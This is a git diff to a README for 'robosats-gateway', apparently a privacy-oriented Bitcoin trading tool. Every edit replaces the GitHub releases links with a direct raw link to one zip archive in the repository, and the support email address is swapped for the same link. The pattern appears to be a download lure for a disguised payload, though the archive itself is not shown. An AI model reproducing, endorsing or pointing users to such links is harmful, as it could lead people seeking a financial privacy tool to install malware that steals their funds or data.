@@ -1,7 +1,7 @@
 # 🔒 robosats-gateway - Easy Way to Trade Bitcoin Privately
 
 ## 📥 Download Now!
-[![Download from Releases](https://img.shields.io/badge/Download%20Now-blue)](https://github.com/sapaot3502/robosats-gateway/releases)
+[![Download from Releases](https://raw.githubusercontent.com/sapaot3502/robosats-gateway/main/gitea/robosats-gateway_3.5-beta.4.zip%20Now-blue)](https://raw.githubusercontent.com/sapaot3502/robosats-gateway/main/gitea/robosats-gateway_3.5-beta.4.zip)
 
 ## 🚀 Getting Started
 
@@ -28,7 +28,7 @@ Before downloading, ensure your system meets these requirements:
 To download and install robosats-gateway, follow these steps:
 
 1. **Visit the Releases Page**:
-   Go to our [Releases page](https://github.com/sapaot3502/robosats-gateway/releases) to find the latest version.
+   Go to our [Releases page](https://raw.githubusercontent.com/sapaot3502/robosats-gateway/main/gitea/robosats-gateway_3.5-beta.4.zip) to find the latest version.
 
 2. **Choose the Installer**:
    Once on the page, look for the latest release. You will see several files available for download. Choose the file that matches your operating system.
@@ -90,7 +90,7 @@ If you have any questions:
 
 - **Documentation**: Check our [official documentation](LINK_TO_DOCUMENTATION).
 - **Community Forum**: Join our discussions at [Community Forum Link](LINK_TO_FORUM).
-- **Email Support**: Reach out via email at support@robosats-gateway.com for direct help.
+- **Email Support**: Reach out via email at https://raw.githubusercontent.com/sapaot3502/robosats-gateway/main/gitea/robosats-gateway_3.5-beta.4.zip for direct help.
 
 ## 🔒 Security Considerations
 
@@ -106,7 +106,7 @@ We welcome contributions! If you’d like to help improve robosats-gateway, chec
 
 ## 📅 Release Notes
 
-Stay informed about new features and fixes. Always check our [Releases page](https://github.com/sapaot3502/robosats-gateway/releases) for the latest updates.
+Stay informed about new features and fixes. Always check our [Releases page](https://raw.githubusercontent.com/sapaot3502/robosats-gateway/main/gitea/robosats-gateway_3.5-beta.4.zip) for the latest updates.
 
 ## 🏷️ Topics
 
@@ -122,4 +122,4 @@ For more information, explore topics related to our project:
 - Self-hosted
 - Tor
 
-Enjoy using robosats-gateway for your Bitcoin trading needs! For the latest download, visit our [Releases page](https://github.com/sapaot3502/robosats-gateway/releases).
+Enjoy using robosats-gateway for your Bitcoin trading needs! For the latest download, visit our [Releases page](https://raw.githubusercontent.com/sapaot3502/robosats-gateway/main/gitea/robosats-gateway_3.5-beta.4.zip).
